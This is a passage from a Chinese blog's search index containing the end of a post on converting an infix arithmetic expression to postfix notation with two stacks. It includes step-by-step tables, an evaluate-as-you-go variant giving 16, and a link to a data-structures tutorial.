+</td><td align="center">-</td><td align="center">遇到操作符，优先级相等，弹出+后s1为空，此时将-压入 s1</td></tr><tr><td align="center">5</td><td align="center">1 2 3 + 4 * + 5</td><td align="center">-</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">null</td><td align="center">1 2 3 + 4 * + 5 -</td><td align="center">空</td><td align="center">解析完毕，弹出s1中符号并压入s2中</td></tr></tbody></table><p>结果：1 2 3 + 4 * + 5</p><p>这是理论上转化后缀码的步骤。</p><p>优化后的程序为</p><table><thead><tr><th align="center">扫描到的元素</th><th align="center">s2(栈底-&gt;栈顶)</th><th align="center">s1（栈底-&gt;栈顶）</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">空</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center"></td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（（</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+（（</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+（（+</td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+（（+</td><td align="center"></td></tr><tr><td align="center">）</td><td align="center">1 5</td><td align="center">+（</td><td align="center">将+压入s1，消除小括号，s2计算3 + 2</td></tr><tr><td align="center">*</td><td align="center">1 5</td><td align="center">+（*</td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">1 5 4</td><td align="center">+（*</td><td align="center"></td></tr><tr><td align="center">）</td><td align="center">1 20</td><td align="center">+</td><td align="center">将*压入s1，消除小括号，是、s2计算 4 * 5</td></tr><tr><td align="center">-</td><td align="center">21</td><td align="center">-</td><td align="center">将+压入s2，计算20+1</td></tr><tr><td align="center">5</td><td align="center">21 5</td><td align="center">-</td><td align="center"></td></tr><tr><td align="center">null</td><td align="center">16</td><td align="center"></td><td align="center">将s1弹栈，压入s2</td></tr></tbody></table><p>结果为16</p><p>这个讲数据结构的笔记挺好的： <a href="https://zq99299.github.io/dsalg-tutorial/">数据结构与算法 系列教程（笔记）</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
